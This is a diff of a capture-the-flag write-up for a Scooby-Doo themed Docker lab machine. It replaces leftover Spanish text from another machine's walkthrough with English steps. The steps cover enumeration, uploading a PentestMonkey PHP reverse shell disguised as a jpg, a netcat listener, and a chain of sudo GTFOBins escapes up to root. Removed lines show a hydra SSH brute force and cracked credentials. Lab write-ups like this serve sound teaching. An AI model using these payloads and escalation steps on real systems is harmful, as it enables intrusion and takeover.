@@ -1,8 +1,8 @@
 # Elevator Machine
 
-Level -> Easy
+**Level:** Easy
 
-Author -> [beafn28](https://www.linkedin.com/in/beatriz-fresno-naumova-3797b931b/)
+**Author:** [beafn28](https://www.linkedin.com/in/beatriz-fresno-naumova-3797b931b/)
 
 ------------------
 ## Scanning & Enumeration 
@@ -16,7 +16,7 @@ PORT   STATE SERVICE REASON
 80/tcp open  http    syn-ack ttl 64
 ```
 
-We run a set of default scripts with **nmap** to gather more information related to the ports discovered in the previous scan.
+Next, we use **nmap** default scripts to gather more information about the discovered ports:
 
 ```shell
 nmap -sCV -p80 172.17.0.2
@@ -27,7 +27,7 @@ PORT   STATE SERVICE VERSION
 |_http-title: El Ascensor Embrujado - Un Misterio de Scooby-Doo
 ```
 
-We access the website to inspect it.
+We access the website to inspect its content:
 
 ![image](https://github.com/user-attachments/assets/638d5eea-f884-48ff-a8a7-81d2d60049f3)
 
@@ -37,7 +37,7 @@ We access the website to inspect it.
 
 After reviewing the page code and interacting with it, we found relevant information such as usernames: **daphne**, **velma**, **scooby**, **shaggy**
 
-We performing a **fuzzing** with **gobuster**
+We perform **fuzzing** using **gobuster**:
 
 ```shell
 gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 20 -x html,php,txt -s 200,301 -b ''
@@ -46,7 +46,8 @@ gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/
 /javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
 /themes               (Status: 301) [Size: 309] [--> http://172.17.0.2/themes/]
 ```
-We found the **javascript** and **themes** directories. After reviewing them, we encountered an unauthorized error and performed **fuzzing** on them.
+
+We identified the **javascript** and **themes** directories. After reviewing them, we encountered an unauthorized error and performed further **fuzzing**:
 
 ```shell
 gobuster dir -u http://172.17.0.2/themes/ -w /usr/share/seclists/Discovery/Web-Content/common-and-spanish.txt -t 20 -x html,php,txt -b '' -s 200,301
@@ -56,18 +57,18 @@ gobuster dir -u http://172.17.0.2/themes/ -w /usr/share/seclists/Discovery/Web-C
 /uploads              (Status: 301) [Size: 317] [--> http://172.17.0.2/themes/uploads/]
 ```
 
-Now we found the **archivo.html** and **upload.php** files and the **uploads** directory.
+We discovered the **archivo.html** and **upload.php** files and the **uploads** directory.
 
 --------------
 ## Explotation
 
-After reviewing the **archivo.html** page we realized that the form can upload **jpg**, and **jpeg**.
+On reviewing the **archivo.html** page, we realized the form allows **jpg** uploads:
 
 ![image](https://github.com/user-attachments/assets/55b5577e-1995-4d60-97eb-15fe5b20ac0f)
 
-We prepare the [PHP Pentester monkey reverse shell](https://www.revshells.com/PHP%20PentestMonkey?ip=172.17.0.1&port=4444&shell=%2Fbin%2Fbash&encoding=%2Fbin%2Fbash) and copy it as a **jpg** file 
+We prepare the [PHP Pentester monkey reverse shell](https://www.revshells.com/PHP%20PentestMonkey?ip=172.17.0.1&port=4444&shell=%2Fbin%2Fbash&encoding=%2Fbin%2Fbash) and save it as a **jpg** file. 
 
-Notice that we set the **172.17.0.1** and **4444** as a **IP** and **PORT** for listener
+Notice that we set the **172.17.0.1** and **4444** as the **IP** and **PORT** for the listener.
 
 ```shell
 wget -O reverse.jpg 'https://www.revshells.com/PHP%20PentestMonkey?ip=172.17.0.1&port=4444&shell=%2Fbin%2Fbash&encoding=%2Fbin%2Fbash'
@@ -77,89 +78,143 @@ reverse.jpg [ <=> ]   2.53K  --.-KB/s    in 0s
 ```
 ![image](https://github.com/user-attachments/assets/1872f317-00b9-48e5-ba2c-9710558af290)
 
-![image](https://github.com/user-attachments/assets/a4d9f597-e9cf-40c2-969e-d40bdb017f94)
+![image](https://github.com/user-attachments/assets/7b56e3c0-1b5c-43c2-87eb-4d40213b32b8)
 
-We start the listener 
-
-Aplicamos fuerza bruta con **hydra** sobre los usuarios:
+We start a **listener** for the reverse shell using **netcat**: 
 
 ```shell
-hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10
+nc -lvnp 4444 
 -------------------------------------------------------------------
-[22][ssh] host: 172.17.0.2   login: carlota   password: babygirl
+listening on [any] 4444 ...
 ```
 
-Encontramos las credenciales de carlota -> **carlota:babygirl**
-Accedemos por ssh:
+Next, we execute the **reverse shell** by uploading the **jpg** file through the **upload.php** link, gaining a shell on the victim's machine:
 
 ```shell
-ssh carlota@172.17.0.2
+connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 43592
+Linux 36ae1fa1a512 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08) x86_64 GNU/Linux
+ 02:37:38 up  6:20,  0 user,  load average: 0.10, 0.10, 0.09
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+bash: cannot set terminal process group (25): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@36ae1fa1a512:/$ 
+```
+------------------------------
+### TTY configuration
+
+We configure the **TTY** for comfortable operation on the console:
+
+```shell
+script /dev/null -c bash 
+```
+After pressing **Ctrl  +  Z**, execute:
+
+```shell
+stty raw -echo; fg
+reset xterm
+stty rows 35 columns 156
+export TERM=xterm
+export SHELL=bash
 ```
 
-Estamos dentro !
+Adjust **rows** and **columns** to match the attacker's screen dimensions:
+
+```shell
+stty size
+```
+
+Now you can use **Ctrl+L** to clear the screen and **Ctrl+C** as needed.
+
 
 ------------------------------
-## Escalada de privilegios
+## Privileges escalation
 
-En el directorio **/home/Desktop/fotos/vacaciones** de Carlota encontramos una imágen.
-
-Nos la descargaremos para verla. Podemos usar **scp**:
-
-```shell
-scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/albertomarcostic/Desktop/DockerLabs/Amor/content
-```
-
-Veremos si tiene algo oculto con la herramienta **steghide**:
-
-```shell
-steghide --extract -sf imagen.jpg
---------------------------------------
-datos extrados e/"secret.txt".
-```
-
-Obtenemos un **secret.txt** con la siguiente información -> **ZXNsYWNhc2FkZXBpbnlwb24=**
-
-Tiene pinta de **base64** así que lo decoficamos:
-
-```shell
-echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d; echo
--------------------------------------------------------
-eslacasadepinypon
-```
-
-Usaremos esta información como contraseña para intentar migrar a otro usuario o convertirnos en **root**:
-
-```shell
-su oscar
-```
-
-Conseguimos migrar al usuario **oscar**.
-Ejecutamos **sudo -l** para ver si podemos ejecutar algo como otro usuario o como **root**:
+We use **sudo -l** to check if we can execute anything as **root**:
 
 ```shell
 sudo -l
 ------------------------------------------------
-User oscar may run the following commands on 6ba86e9dc48a:
-    (ALL) NOPASSWD: /usr/bin/ruby
+User www-data may run the following commands on 36ae1fa1a512:
+    (daphne) NOPASSWD: /usr/bin/env
+```
+
+We can run **env** as the **daphne** user using [GTFOBins for env](https://gtfobins.github.io/gtfobins/env/#sudo)
+
+```shell
+sudo -u daphne env /bin/bash
+```
+
+Repeat the **sudo -l** command to escalate privileges step by step until achieving root access:
+
+```shell
+sudo -l
+------------------------------------------------
+User daphne may run the following commands on 36ae1fa1a512:
+    (vilma) NOPASSWD: /usr/bin/ash
 ```
 
 
-Podemos ejecutar **ruby** como el usuario **root**, si no sabemos como abusar de esto, siempre podemos recurrir a [GTFOBins]()
-
 ```shell
-sudo /usr/bin/ruby -e 'exec "/bin/bash"'
+sudo -u vilma ash
 ```
 
 ```shell
+sudo -l
+------------------------------------------------
+User vilma may run the following commands on 36ae1fa1a512:
+    (shaggy) NOPASSWD: /usr/bin/ruby
+```
+
+[GTFOBins for ruby](https://gtfobins.github.io/gtfobins/ruby/#sudo)
+
+```shell
+sudo -u shaggy ruby -e 'exec "/bin/bash"'
+```
+
+```shell
+sudo -l
+------------------------------------------------
+User shaggy may run the following commands on 36ae1fa1a512:
+    (fred) NOPASSWD: /usr/bin/lua
+```
+
+[GTFOBins for lua](https://gtfobins.github.io/gtfobins/lua/#sudo)
+
+```shell
+sudo -u fred lua -e 'os.execute("/bin/bash")'
+```
+
+```shell
+sudo -l
+------------------------------------------------
+User fred may run the following commands on 36ae1fa1a512:
+    (scooby) NOPASSWD: /usr/bin/gcc
+```
+
+[GTFOBins for gcc](https://gtfobins.github.io/gtfobins/gcc/#sudo)
+
+```shell
+sudo -u scooby gcc -wrapper /bin/bash,-s .
+```
+
+```shell
+sudo -l
+------------------------------------------------
+User scooby may run the following commands on 36ae1fa1a512:
+    (root) NOPASSWD: /usr/bin/sudo
+```
+
+[GTFOBins for sudo](https://gtfobins.github.io/gtfobins/sudo/#sudo)
+
+```shell
+sudo sudo /bin/bash
+```
+
+Finally, we gain root access:
+
+```
 whoami
 ----------------
 root
-```
-
-Hemos alcanzado el nivel de privilegios máximo en la máquina.
-
-```shell
-cat /root/Desktop/THX.txt
--------------------------------
-Gracias a toda la comunidad de Dockerlabs y a Mario por toda la ayuda proporcionada para poder hacer la máquina.
 ```
